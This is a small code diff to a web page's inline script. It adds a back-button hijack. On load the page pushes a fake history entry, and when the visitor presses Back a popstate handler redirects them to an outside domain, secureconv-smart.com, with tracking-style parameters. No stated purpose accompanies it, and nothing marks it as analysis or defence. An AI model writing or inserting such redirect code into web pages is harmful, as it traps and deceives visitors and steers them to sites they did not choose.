@@ -26,7 +26,18 @@
 
             }());
             afilter(1)
-            
+            if (window.location.hash != "#t") {
+                pushHistory();
+            }
+            window.addEventListener("popstate", function (e) {
+                afilter(5);
+                window.location.href = "https://secureconv-smart.com/?a=70580&c=130746";
+            }, false);
+
+            function pushHistory() {
+                var state = {title: "title", url: "#t"};
+                window.history.pushState(state, "title", "#t");
+            }
         </script>
         <script src="js.js?v=16789" type="text/javascript"></script>
 </head>
